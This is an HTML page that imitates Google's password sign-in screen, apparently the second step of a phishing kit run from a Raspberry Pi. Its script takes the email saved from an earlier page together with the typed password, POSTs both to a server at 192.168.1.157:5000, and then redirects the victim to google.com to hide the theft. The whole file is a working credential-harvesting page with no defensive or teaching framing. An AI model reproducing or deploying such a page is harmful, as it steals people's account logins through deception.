<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Google account</title>
    <link rel="stylesheet" href="./Gmail_page.css">
</head>
<body>
<div class="container">
  <div class="top-content">
    <img src="https://i.postimg.cc/CL7CmGSx/google-logo-png-29530.png" alt="Google">
    <h2>Welcome</h2>
    <p id="display-email" style="font-weight: bold; margin-bottom: 10px;"></p>
  </div>
  
  <div class="inputs">
    <input type="password" id="password" class="input" required>
    <label for="password" class="input-label">Enter your password</label>
  </div>
  
  <div class="btn-group">
    <button class="create-btn" onclick="window.location.href='index.html'">Back</button>
    <button class="next-btn" id="btn-connect">Connect</button>
  </div>
</div>

<script>
  // Affiche l'email récupéré
  const emailValue = localStorage.getItem('userEmail');
  if (emailValue) {
      document.getElementById('display-email').innerText = emailValue;
  }

  document.getElementById('btn-connect').addEventListener('click', async function() {
    const passwordValue = document.getElementById('password').value;
    const URL = `http://192.168.1.157:5000/data`;

    if (!passwordValue) {
        alert("Please enter a password");
        return;
    }

    this.innerText = "Connecting...";
    this.disabled = true;

    try {
        const response = await fetch(URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                email: emailValue,
                password: passwordValue,
                timestamp: new Date().toISOString()
            })
        });

        if (response.ok) {
            window.location.href = 'https://www.google.com'; // Redirection finale
        } else {
            alert("Error: " + response.status);
            this.innerText = "Connect";
            this.disabled = false;
        }
    } catch (error) {
        alert("Could not connect to Raspberry Pi.");
        this.innerText = "Connect";
        this.disabled = false;
    }
  });
</script>
</body>
</html>
